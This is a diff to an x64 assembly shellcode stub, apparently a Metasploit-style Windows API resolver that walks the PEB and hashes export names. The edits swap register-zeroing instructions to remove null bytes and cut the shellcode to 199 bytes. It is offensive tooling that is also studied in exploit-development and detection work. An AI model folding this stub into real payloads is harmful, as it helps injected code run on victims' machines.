@@ -2,9 +2,11 @@
 ; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
 ; Compatible: Windows 7 / Server 2003 and newer
 ; Architecture: x64
-; Size: 203 bytes
+; Size: 199 bytes
 ;
-; 2023-04-24 Hotfix by Helvio Junior (M4v3r1ck) to avoid NULLBYTE
+; 2023-04-25 Hotfix by Helvio Junior (M4v3r1ck) 
+;  -> avoid NULLBYTE
+;  -> reduce size of shellcode
 ;-----------------------------------------------------------------------------;
 
 [BITS 64]
@@ -26,7 +28,7 @@ api_call:
   push rdx                    ; Save the 2nd parameter
   push rcx                    ; Save the 1st parameter
   push rsi                    ; Save RSI
-  xor rdx, rdx                ; Zero rdx
+  xor edx, edx                ; Zero rdx
   mov rdx, [gs:rdx+0x60]      ; Get a pointer to the PEB
   mov rdx, [rdx+0x18]         ; Get PEB->Ldr
   mov rdx, [rdx+0x20]         ; Get the first module from the InMemoryOrder module list
@@ -35,7 +37,7 @@ next_mod:                     ;
   movzx rcx, word [rdx+0x4a]  ; Set rcx to the length we want to check
   xor r9, r9                  ; Clear r9 which will store the hash of the module name
 loop_modname:                 ;
-  xor rax, rax                ; Clear rax
+  xor eax, eax                ; Clear rax
   lodsb                       ; Read in the next byte of the name
   cmp al, 'a'                 ; Some versions of Windows use lower case module names
   jl not_lowercase            ;
@@ -56,7 +58,7 @@ not_lowercase:                ;
   ; their may be a PE32 module present in the PEB's module list, (typicaly the main module).
   ; as we are using the win64 PEB ([gs:96]) we wont see the wow64 modules present in the win32 PEB ([fs:48])
   jne get_next_mod1           ; if not, proceed to the next module
-  xor rsi, rsi                ; clear rsi
+  xor esi, esi                ; clear rsi
   mov sil, 0x88               ; Set rsi as 0x88 using only 1 byte register (sil)
   mov eax, dword [rax+rsi]    ; Get export tables RVA => use rsi to calculate 0x88 to avoid NULLBYTE
   test rax, rax               ; Test if no export address table is present
@@ -75,7 +77,7 @@ get_next_func:                ;
   xor r9, r9                  ; Clear r9 which will store the hash of the function name
   ; And compare it to the one we want
 loop_funcname:                ;
-  xor rax, rax                ; Clear rax
+  xor eax, eax                ; Clear rax
   lodsb                       ; Read in the next byte of the ASCII function name
   ror r9d, 0xd                ; Rotate right our hash value
   add r9d, eax                ; Add the next byte of the name
